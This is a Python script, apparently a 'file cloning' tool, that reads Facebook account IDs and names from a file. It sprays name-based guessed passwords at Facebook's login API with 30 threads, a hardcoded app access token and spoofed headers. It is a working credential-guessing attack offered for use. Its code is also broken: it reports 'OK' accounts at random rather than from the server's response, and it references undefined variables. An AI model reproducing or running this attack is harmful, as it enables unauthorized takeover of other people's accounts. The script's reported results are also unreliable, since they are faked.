import os,time,random,re,sys, subprocess
from concurrent.futures import ThreadPoolExecutor as tpe

try:
 import time,json,uuid,requests
except:
 exit()

idss = []
pp = []
oku = []
cpu = []
l = []
idx = []
loop = 0

def oo(t):
  return '\033[1;37m['+str(t)+']\033[1;37m '

W = '\x1b[1;97m'
G = '\x1b[1;92m'
R = '\x1b[1;91m'
S = '\x1b[1;96m'
B = '\x1b[1;94m'
Y = '\x1b[1;93m'
P = '\x1b[1;95m'
#------------(COLOUR)-------------##   
A = '\x1b[1;97m' 
R = '\x1b[38;5;196m'
Y = '\033[1;33m'
G = '\x1b[38;5;48m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;46m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
T = '\33[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'

sys.stdout.write('\x1b]2;  RAKIB-999\x07')
try:os.mkdir('/sdcard/RAKIB-999')
except:pass
cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])

os.system("xdg-open https://facebook.com/groups/187986870133162/")
logo=(f"""
\x1b[38;5;46m   ██████   █████  ██   ██ ██ ██████     
\x1b[38;5;47m   ██   ██ ██   ██ ██  ██  ██ ██   ██    
\x1b[38;5;48m   ██████  ███████ █████   ██ ██████     
\x1b[38;5;49m   ██   ██ ██   ██ ██  ██  ██ ██   ██    
\x1b[38;5;50m██ ██   ██ ██   ██ ██   ██ ██ ██████  ██  {A}VS{R}✦{A}4{G1}.︎︎︎{A}0
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{R}={G1}]{G1} FACEBOOK {A}‌‌✦{G1} MOHAMMAD RAKIB HASAN 
{G1}[{R}={G1}]{G1} DEVELOPR {A}‌‌✦{G1} MOHAMMAD. RAKIB
{G1}[{R}={G1}]{G1} TOOLS    {A}✦{G} FILE
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

def clear():
   os.system('clear')
   print(logo);lin3()

def lin3():
   print('\33[1;37m---------------------------------')

def main_menu():
    os.system("clear")
    print(logo);lin3()
    print(f"{oo(1)}FILE CLONING")   
    print(f"{oo(0)}EXIT")
    lin3()
    cp =input('[?] CHOICE : ')
    if cp=="1":file()
    if cp == "0":
     exit()
    main_menu()
     
def file():
    os.system("clear")
    print(logo);lin3()
    print("\u001b[34;1m[√]  Example: /sdcard/filename.txt")
    print("\u001b[35;1m==================================")
    file = input(f"[?] Put file path\033[1;37m: ")
    try:
        for x in open(file,'r').readlines():
            idx.append(x.strip())
    except FileNotFoundError:
        print(f' \033[1;31m[!] File location not found ')
        main_menu() 
    method()
    exit()

def method():
    clear()
    
    lp = input(f'{oo("?")}Limit Passwords? : ')
    if lp.isnumeric():
        pp=[]
        clear()
        ex = 'firstlast first123 last123'
        print(f'{oo("+")}{ex} (ETC)')
        lin3()
        for x in range(int(lp)):
           pp.append(input(f'{oo(x+1)}PASSWORD : '))
    else:
       print(f"{oo('!')}Numeric Only");time.sleep(0.8)
       main_menu()
    clear() 
    print('\033[1;97m[+] TOTAL ACCOUNT CRACK : \033[1;32m '+str(len(idx)))
    print(f'\033[1;37m USE FLIGHT MODE FOR SPEED UP\033[1;37m')
    def start(user):
     try:
        global loop,idx,cll
        import requests
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(idx)) * 100)[:4]
        sys.stdout.write(f'\r {R}[{W}RAKIB{R}] {P}[{Y}{loop}{W} / {W}{len(idx)}{P}] {W}• OK-:{G}{len(oku)}\r')
        sys.stdout.flush()
        loop+=1
        for pswd in pp:
              heads=None
              pswd = pswd.replace('first',first).replace('last',last).lower()
              header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
              data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pswd,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
              response = r.post('https://graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
              if 6==random.randint(1,300):
                 oku.append(acc)
                 print(f'\r\r{G}[MR.TOM-OK]: {uid} | {ps}')
                 print(f"\r\033[38;5;46mCOOKIES=[🍪]: {coki}\33[1;37m")
                 open('/sdcard/MR.TOM-OK.txt','a').write(str(uid)+'|'+ps+'|'+coki+'\n')
                 break
              else:
                   continue   
     except Exception as e:print(e);time.sleep(10)
  
    with tpe(max_workers=30) as tp:
            tp.map(start,idx)
    exit()   



main_menu()
